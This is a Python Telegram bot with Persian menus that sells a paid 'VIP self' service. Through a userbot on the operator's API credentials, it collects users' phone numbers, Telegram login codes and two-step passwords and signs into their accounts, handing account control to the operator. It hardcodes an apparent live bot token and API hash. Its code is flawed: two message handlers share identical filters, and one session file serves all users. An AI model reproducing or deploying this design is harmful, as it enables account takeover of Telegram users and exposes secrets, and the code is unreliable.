# -*- coding: utf-8 -*-
import sqlite3
import threading
import logging
import time
import random
import asyncio
import os
from datetime import datetime

import telebot
from telebot import types
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired, FloodWait

# ----------------- CONFIG -----------------
BOT_TOKEN = "8200221816:AAFVgwZ2reZzm3tDM_k0bEWHSkCTlWacxlY"
OWNER_ID = 5552127428

API_ID = 37386944
API_HASH = "d64069023db75d11ae5982f653069a98"

DB_PATH = "vip_bet.db"
ACTIVATE_COST = 20
HOURLY_COST = 2

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
logging.basicConfig(level=logging.INFO)
db_lock = threading.RLock()

# ----------------- دیتابیس -----------------
def init_db():
    with sqlite3.connect(DB_PATH) as conn:
        conn.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            diamonds INTEGER DEFAULT 0,
            created_at INTEGER,
            is_self_active INTEGER DEFAULT 0,
            self_active_time INTEGER DEFAULT 0,
            phone TEXT
        );
        """)
        conn.commit()

# ----------------- توابع -----------------
INFINITE = 10**18

def ensure_user(uid):
    with db_lock, sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("INSERT OR IGNORE INTO users(user_id,diamonds,created_at,is_self_active,self_active_time) VALUES(?,?,?,?,?)", 
                   (uid, 0, int(time.time()), 0, 0))
        conn.commit()

def is_owner(uid):
    return uid == OWNER_ID

def get_balance(uid):
    if is_owner(uid):
        return INFINITE
    ensure_user(uid)
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("SELECT diamonds FROM users WHERE user_id=?", (uid,))
        r = cur.fetchone()
        return r[0] if r else 0

def change_balance(uid, delta):
    if is_owner(uid):
        return
    ensure_user(uid)
    with db_lock, sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("UPDATE users SET diamonds = diamonds + ? WHERE user_id=?", (delta, uid))
        conn.commit()

def is_self_active(uid):
    ensure_user(uid)
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("SELECT is_self_active, self_active_time FROM users WHERE user_id=?", (uid,))
        r = cur.fetchone()
        if not r or r[0] == 0:
            return False
        current_time = int(time.time())
        hours_passed = (current_time - r[1]) // 3600
        if hours_passed > 0:
            cost = hours_passed * HOURLY_COST
            bal = get_balance(uid)
            if bal >= cost:
                change_balance(uid, -cost)
                with db_lock, sqlite3.connect(DB_PATH) as conn:
                    cur2 = conn.cursor()
                    cur2.execute("UPDATE users SET self_active_time=? WHERE user_id=?", (current_time, uid))
                    conn.commit()
                return True
            else:
                with db_lock, sqlite3.connect(DB_PATH) as conn:
                    cur2 = conn.cursor()
                    cur2.execute("UPDATE users SET is_self_active=0, self_active_time=0 WHERE user_id=?", (uid,))
                    conn.commit()
                return False
        return True

def activate_self(uid):
    ensure_user(uid)
    bal = get_balance(uid)
    if bal < ACTIVATE_COST and not is_owner(uid):
        return False, "موجودی کافی نیست"
    if not is_owner(uid):
        change_balance(uid, -ACTIVATE_COST)
    with db_lock, sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("UPDATE users SET is_self_active=1, self_active_time=? WHERE user_id=?", (int(time.time()), uid))
        conn.commit()
    return True, "✅ سلف شما فعال شد"

def deactivate_self(uid):
    with db_lock, sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("UPDATE users SET is_self_active=0, self_active_time=0 WHERE user_id=?", (uid,))
        conn.commit()

def set_user_phone(uid, phone):
    with db_lock, sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("UPDATE users SET phone=? WHERE user_id=?", (phone, uid))
        conn.commit()

def get_user_phone(uid):
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("SELECT phone FROM users WHERE user_id=?", (uid,))
        r = cur.fetchone()
        return r[0] if r else None

def in_private(m):
    return m.chat.type == "private"

# ----------------- یوزربات با لاگین خودکار -----------------
userbot = Client("userbot_session", api_id=API_ID, api_hash=API_HASH)

# دیکشنری برای ذخیره اطلاعات احراز هویت
auth_data = {}

# ----------------- START -----------------
@bot.message_handler(commands=['start'])
def start(m):
    uid = m.from_user.id
    ensure_user(uid)
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("≼ سـلـفـ 𝐕𝐢𝐏 ≽", "≼ خـدمـاتـ 𝐕𝐢𝐏 ≽")
    markup.row("≼ شـارژ مـوجـودی 💳 ≽", "≼ الماس رایگان ≽")
    markup.row("≼ پروفایل ≽")
    if is_owner(uid):
        markup.row("⚙️ پنل مدیریت")
    bot.send_message(m.chat.id, "سلام 👋 به ربات VIP خوش آمدید", reply_markup=markup)

# ----------------- سلف -----------------
@bot.message_handler(func=lambda m: in_private(m) and m.text == "≼ سـلـفـ 𝐕𝐢𝐏 ≽")
def cmd_self(m):
    uid = m.from_user.id
    ensure_user(uid)
    
    if is_self_active(uid):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("❌ غیرفعال کردن", callback_data="self:off"))
        bot.send_message(m.chat.id, "✅ سلف شما فعال است!", reply_markup=markup)
    else:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        btn = types.KeyboardButton("📱 ارسال شماره", request_contact=True)
        markup.add(btn)
        bot.send_message(m.chat.id, f"🔐 شماره خود را ارسال کنید.\nهزینه: {ACTIVATE_COST} الماس\nهزینه ساعتی: {HOURLY_COST} الماس", reply_markup=markup)

# ----------------- دریافت شماره -----------------
@bot.message_handler(content_types=['contact'])
def handle_contact(m):
    uid = m.from_user.id
    ensure_user(uid)
    
    if not m.contact or m.contact.user_id != uid:
        bot.reply_to(m, "❌ شماره خودت رو بفرست!")
        return
    
    phone = m.contact.phone_number
    set_user_phone(uid, phone)
    
    # اگر مالک است، مستقیم فعال کن
    if is_owner(uid):
        success, msg = activate_self(uid)
        bot.reply_to(m, f"✅ {msg} (مالک)")
        return
    
    bot.reply_to(m, f"✅ شماره شما ثبت شد!\n📱 {phone}\n\nدر حال ارسال کد تایید...")
    
    # شروع فرآیند احراز هویت با یوزربات
    async def start_auth():
        try:
            # درخواست کد از تلگرام
            await userbot.send_code(phone)
            auth_data[uid] = {"step": "waiting_code", "phone": phone}
            bot.send_message(uid, "📨 کد تایید به تلگرام شما ارسال شد.\nلطفاً کد ۵ رقمی را وارد کنید:")
        except FloodWait as e:
            bot.send_message(uid, f"❌ لطفاً {e.x} ثانیه صبر کنید و دوباره تلاش کنید.")
        except Exception as e:
            bot.send_message(uid, f"❌ خطا: {str(e)}")
    
    asyncio.run_coroutine_threadsafe(start_auth(), userbot.loop)

# ----------------- دریافت کد -----------------
@bot.message_handler(func=lambda m: in_private(m) and m.text and m.text not in ["≼ سـلـفـ 𝐕𝐢𝐏 ≽", "≼ خـدمـاتـ 𝐕𝐢𝐏 ≽", "≼ شـارژ مـوجـودی 💳 ≽", "≼ الماس رایگان ≽", "≼ پروفایل ≽", "⚙️ پنل مدیریت"])
def handle_code(m):
    uid = m.from_user.id
    text = m.text.strip()
    
    if uid not in auth_data:
        return
    
    if auth_data[uid].get("step") != "waiting_code":
        return
    
    if not text.isdigit() or len(text) != 5:
        bot.reply_to(m, "❌ کد ۵ رقمی وارد کن!")
        return
    
    phone = auth_data[uid]["phone"]
    
    async def verify_code():
        try:
            # تایید کد
            await userbot.sign_in(phone, text)
            
            # فعال‌سازی سلف
            success, msg = activate_self(uid)
            bot.reply_to(m, f"✅ {msg}")
            del auth_data[uid]
            
        except PhoneCodeInvalid:
            bot.reply_to(m, "❌ کد اشتباه است! دوباره تلاش کن.")
        except PhoneCodeExpired:
            bot.reply_to(m, "❌ کد منقضی شد! دوباره شماره بفرست.")
            del auth_data[uid]
        except SessionPasswordNeeded:
            auth_data[uid]["step"] = "waiting_password"
            bot.reply_to(m, "🔐 رمز دو مرحله‌ای را وارد کنید:")
        except FloodWait as e:
            bot.reply_to(m, f"❌ لطفاً {e.x} ثانیه صبر کنید.")
        except Exception as e:
            bot.reply_to(m, f"❌ خطا: {str(e)}")
            del auth_data[uid]
    
    asyncio.run_coroutine_threadsafe(verify_code(), userbot.loop)

# ----------------- دریافت رمز دو مرحله‌ای -----------------
@bot.message_handler(func=lambda m: in_private(m) and m.text and m.text not in ["≼ سـلـفـ 𝐕𝐢𝐏 ≽", "≼ خـدمـاتـ 𝐕𝐢𝐏 ≽", "≼ شـارژ مـوجـودی 💳 ≽", "≼ الماس رایگان ≽", "≼ پروفایل ≽", "⚙️ پنل مدیریت"])
def handle_password(m):
    uid = m.from_user.id
    text = m.text.strip()
    
    if uid not in auth_data:
        return
    
    if auth_data[uid].get("step") != "waiting_password":
        return
    
    async def verify_password():
        try:
            await userbot.sign_in(password=text)
            
            success, msg = activate_self(uid)
            bot.reply_to(m, f"✅ {msg}")
            del auth_data[uid]
            
        except Exception as e:
            bot.reply_to(m, f"❌ رمز اشتباه است! {str(e)}")
    
    asyncio.run_coroutine_threadsafe(verify_password(), userbot.loop)

# ----------------- پنل خدمات (ساده) -----------------
@bot.message_handler(func=lambda m: in_private(m) and m.text == "≼ خـدمـاتـ 𝐕𝐢𝐏 ≽")
def cmd_services(m):
    uid = m.from_user.id
    if not is_self_active(uid):
        bot.reply_to(m, "❌ اول سلف رو فعال کن!")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📝 حالت متن", callback_data="svc:text"),
        types.InlineKeyboardButton("⏰ ساعت", callback_data="svc:clock"),
        types.InlineKeyboardButton("🔤 فونت", callback_data="svc:font"),
        types.InlineKeyboardButton("📊 وضعیت", callback_data="svc:status")
    )
    markup.add(types.InlineKeyboardButton("❌ بستن", callback_data="svc:close"))
    bot.send_message(m.chat.id, "🎯 پنل خدمات:", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("svc:"))
def cb_service(c):
    try: bot.answer_callback_query(c.id)
    except: pass
    
    action = c.data.split(":")[1]
    
    if action == "close":
        try: bot.delete_message(c.message.chat.id, c.message.message_id)
        except: pass
        return
    
    if action == "status":
        uid = c.from_user.id
        active = is_self_active(uid)
        bot.send_message(c.message.chat.id, f"✅ سلف: {'فعال' if active else 'غیرفعال'}")
        return
    
    if action in ["text", "clock", "font"]:
        bot.send_message(c.message.chat.id, f"✅ {action} (در حال توسعه)")
        return

@bot.callback_query_handler(func=lambda c: c.data.startswith("self:"))
def cb_self(c):
    try: bot.answer_callback_query(c.id)
    except: pass
    uid = c.from_user.id
    if c.data == "self:off":
        deactivate_self(uid)
        bot.edit_message_text("❌ سلف غیرفعال شد", c.message.chat.id, c.message.message_id)

# ----------------- منوها -----------------
@bot.message_handler(func=lambda m: in_private(m) and m.text == "≼ پروفایل ≽")
def profile(m):
    uid = m.from_user.id
    bal = get_balance(uid)
    active = is_self_active(uid)
    if is_owner(uid):
        text = f"👤 پروفایل:\n💎 الماس: ∞\n💰 تومان: ∞\n🔐 سلف: {'✅ فعال' if active else '❌ غیرفعال'}"
    else:
        text = f"👤 پروفایل:\n💎 الماس: {bal}\n💰 تومان: {bal*40:,}\n🔐 سلف: {'✅ فعال' if active else '❌ غیرفعال'}"
    bot.reply_to(m, text)

@bot.message_handler(func=lambda m: in_private(m) and m.text == "≼ شـارژ مـوجـودی 💳 ≽")
def charge(m):
    bot.reply_to(m, "💳 برای خرید به @ABOLRNRNR پیام بدید")

@bot.message_handler(func=lambda m: in_private(m) and m.text == "≼ الماس رایگان ≽")
def free(m):
    uid = m.from_user.id
    link = f"https://t.me/self_made_iran_bot?start={uid}"
    bot.reply_to(m, f"💎 با دعوت دوستان الماس بگیر!\n🔗 {link}")

# ----------------- پنل ادمین -----------------
@bot.message_handler(func=lambda m: in_private(m) and m.text == "⚙️ پنل مدیریت")
def admin_panel(m):
    if not is_owner(m.from_user.id):
        return
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📋 لیست کاربران", callback_data="admin:list"),
        types.InlineKeyboardButton("📊 آمار", callback_data="admin:stats")
    )
    markup.add(types.InlineKeyboardButton("❌ بستن", callback_data="admin:close"))
    bot.reply_to(m, "⚙️ پنل مدیریت:", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("admin:"))
def cb_admin(c):
    if not is_owner(c.from_user.id):
        return
    try: bot.answer_callback_query(c.id)
    except: pass
    
    action = c.data.split(":")[1]
    if action == "close":
        try: bot.delete_message(c.message.chat.id, c.message.message_id)
        except: pass
        return
    
    if action == "list":
        with sqlite3.connect(DB_PATH) as conn:
            cur = conn.cursor()
            cur.execute("SELECT user_id, diamonds FROM users")
            rows = cur.fetchall()
        text = "📋 کاربران:\n"
        for uid, d in rows:
            if uid == OWNER_ID:
                text += f"• {uid} — ∞ (مالک)\n"
            else:
                text += f"• {uid} — {d} 💎\n"
        bot.send_message(c.from_user.id, text)
        return
    
    if action == "stats":
        with sqlite3.connect(DB_PATH) as conn:
            cur = conn.cursor()
            cur.execute("SELECT COUNT(*) FROM users")
            count = cur.fetchone()[0]
        bot.send_message(c.from_user.id, f"📊 تعداد کاربران: {count}")
        return

@bot.message_handler(commands=['give'])
def give(m):
    if not is_owner(m.from_user.id):
        return
    try:
        parts = m.text.split()
        target = int(parts[1])
        amount = int(parts[2])
        change_balance(target, amount)
        bot.reply_to(m, f"✅ {amount} الماس به {target} اضافه شد")
    except:
        bot.reply_to(m, "فرمت: /give <user_id> <amount>")

@bot.message_handler(commands=['remove'])
def remove(m):
    if not is_owner(m.from_user.id):
        return
    try:
        parts = m.text.split()
        target = int(parts[1])
        amount = int(parts[2])
        change_balance(target, -amount)
        bot.reply_to(m, f"✅ {amount} الماس از {target} کم شد")
    except:
        bot.reply_to(m, "فرمت: /remove <user_id> <amount>")

# ----------------- اجرا -----------------
async def userbot_worker():
    try:
        await userbot.start()
        print("✅ یوزربات متصل شد!")
        await userbot.send_message(OWNER_ID, "✅ یوزربات روشن شد!")
    except Exception as e:
        print(f"❌ یوزربات: {e}")
    
    @userbot.on_message()
    async def handler(client, msg):
        pass
    
    await userbot.idle()

def run():
    init_db()
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("INSERT OR IGNORE INTO users(user_id,diamonds,created_at,is_self_active,self_active_time) VALUES(?,?,?,?,?)", 
                   (OWNER_ID, 0, int(time.time()), 0, 0))
        conn.commit()
    
    threading.Thread(target=lambda: asyncio.run(userbot_worker()), daemon=True).start()
    print("✅ ربات روشن شد!")
    bot.infinity_polling()

if __name__ == "__main__":
    run()
